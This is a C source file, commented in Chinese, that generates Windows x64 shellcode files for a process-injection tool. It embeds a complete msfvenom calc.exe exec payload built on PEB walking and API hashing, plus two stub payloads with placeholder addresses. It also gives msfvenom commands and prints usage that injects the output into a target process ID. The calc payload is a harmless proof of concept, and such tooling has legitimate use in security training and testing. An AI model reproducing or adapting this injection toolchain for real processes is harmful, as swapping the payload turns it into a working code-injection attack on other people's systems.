/**
 * ===================================================================
 * Shellcode 生成器
 * ===================================================================
 *
 * 生成测试用的 shellcode：
 * 1. MessageBox - 显示消息框
 * 2. Calc - 启动 calc.exe
 */

#include <windows.h>
#include <stdio.h>

/**
 * ===================================================================
 * MessageBox Shellcode (x64)
 * ===================================================================
 *
 * 功能: MessageBoxA(NULL, "Shellcode Injected!", "Success", MB_OK)
 *
 * 生成方法：
 * 1. 使用 msfvenom:
 *    msfvenom -p windows/x64/messagebox TEXT="Shellcode Injected!" \
 *             TITLE="Success" -f c
 *
 * 或手写汇编：
 * 48 83 EC 28          sub    rsp, 0x28
 * 48 31 C9             xor    rcx, rcx              ; NULL
 * 48 8D 15 XX XX XX XX lea    rdx, [rip+message]    ; "Shellcode..."
 * 4C 8D 05 XX XX XX XX lea    r8, [rip+title]       ; "Success"
 * 4D 31 C9             xor    r9, r9                ; MB_OK
 * 48 B8 XX XX XX XX... mov    rax, MessageBoxA
 * FF D0                call   rax
 * 48 83 C4 28          add    rsp, 0x28
 * C3                   ret
 */

// MessageBox shellcode (x64)
// 显示消息框: "Shellcode Injected!" / "Success"
unsigned char messagebox_shellcode[] = {
    // 实际的 shellcode 需要通过 msfvenom 或手动编写
    // 这里提供一个简化的示例框架

    // sub rsp, 0x28 (为 shadow space 预留空间)
    0x48, 0x83, 0xEC, 0x28,

    // xor rcx, rcx (第一个参数: NULL)
    0x48, 0x31, 0xC9,

    // mov rdx, <message_address> (第二个参数: 消息文本)
    // lea rdx, [rip+offset]
    0x48, 0x8D, 0x15, 0x49, 0x00, 0x00, 0x00,

    // mov r8, <title_address> (第三个参数: 标题)
    // lea r8, [rip+offset]
    0x4C, 0x8D, 0x05, 0x56, 0x00, 0x00, 0x00,

    // xor r9, r9 (第四个参数: MB_OK = 0)
    0x4D, 0x31, 0xC9,

    // mov rax, MessageBoxA (需要动态获取地址)
    // 这里使用占位符，实际需要修复
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // call rax
    0xFF, 0xD0,

    // add rsp, 0x28 (恢复栈)
    0x48, 0x83, 0xC4, 0x28,

    // ret
    0xC3,

    // 填充到 0x50 偏移
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90,

    // Message: "Shellcode Injected!\0"
    0x53, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64,
    0x65, 0x20, 0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x21, 0x00,

    // Title: "Success\0"
    0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00
};

/**
 * ===================================================================
 * Calc Shellcode (x64)
 * ===================================================================
 *
 * 功能: WinExec("calc", SW_SHOW)
 *
 * 生成方法：
 * msfvenom -p windows/x64/exec CMD=calc.exe -f c
 */

// Calc shellcode (x64) - 使用 msfvenom 生成
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char calc_shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x00";

/**
 * ===================================================================
 * 简单的 ExitThread Shellcode (x64)
 * ===================================================================
 *
 * 功能: ExitThread(0)
 * 最简单的 shellcode，用于测试注入是否成功
 */

unsigned char exit_shellcode[] = {
    // 48 31 C9    xor rcx, rcx        ; 参数 = 0
    0x48, 0x31, 0xC9,

    // 48 B8 ...   mov rax, ExitThread ; 需要修复地址
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // FF D0       call rax
    0xFF, 0xD0
};

/**
 * ===================================================================
 * 写入 shellcode 到文件
 * ===================================================================
 */
BOOL WriteShellcodeToFile(const char* filename, unsigned char* shellcode, size_t size) {
    FILE* file = fopen(filename, "wb");
    if (!file) {
        printf("[-] 无法创建文件: %s\n", filename);
        return FALSE;
    }

    size_t written = fwrite(shellcode, 1, size, file);
    fclose(file);

    if (written != size) {
        printf("[-] 写入文件失败\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Shellcode 生成器\n");
    printf("===================================================================\n\n");

    if (argc < 2) {
        printf("用法: %s <shellcode_type>\n\n", argv[0]);
        printf("Shellcode 类型:\n");
        printf("  messagebox - MessageBox shellcode (需要手动修复)\n");
        printf("  calc       - 启动 calc.exe\n");
        printf("  exit       - ExitThread (测试用)\n\n");
        printf("示例:\n");
        printf("  %s calc\n", argv[0]);
        return 1;
    }

    const char* type = argv[1];
    char filename[256];
    sprintf(filename, "%s_shellcode.bin", type);

    if (strcmp(type, "messagebox") == 0) {
        printf("[*] 生成 MessageBox shellcode...\n");
        printf("[!] 注意: 此 shellcode 需要手动修复 MessageBoxA 地址\n");
        printf("[!] 建议使用 msfvenom 生成完整的 shellcode\n\n");

        if (WriteShellcodeToFile(filename, messagebox_shellcode, sizeof(messagebox_shellcode))) {
            printf("[+] Shellcode 已生成: %s (%zu bytes)\n", filename, sizeof(messagebox_shellcode));
        }
    }
    else if (strcmp(type, "calc") == 0) {
        printf("[*] 生成 Calc shellcode...\n");
        printf("[*] 此 shellcode 使用 msfvenom 生成，可直接使用\n\n");

        if (WriteShellcodeToFile(filename, calc_shellcode, sizeof(calc_shellcode) - 1)) {  // -1 去除 null terminator
            printf("[+] Shellcode 已生成: %s (%zu bytes)\n", filename, sizeof(calc_shellcode) - 1);
            printf("[+] 功能: 启动 calc.exe\n");
        }
    }
    else if (strcmp(type, "exit") == 0) {
        printf("[*] 生成 ExitThread shellcode...\n");
        printf("[!] 注意: 此 shellcode 需要手动修复 ExitThread 地址\n");
        printf("[!] 建议使用 msfvenom 生成完整的 shellcode\n\n");

        if (WriteShellcodeToFile(filename, exit_shellcode, sizeof(exit_shellcode))) {
            printf("[+] Shellcode 已生成: %s (%zu bytes)\n", filename, sizeof(exit_shellcode));
        }
    }
    else {
        printf("[-] 未知的 shellcode 类型: %s\n", type);
        return 1;
    }

    printf("\n===================================================================\n");
    printf("使用方法:\n");
    printf("  shellcode_injection.exe 1234 %s\n", filename);
    printf("===================================================================\n");

    return 0;
}
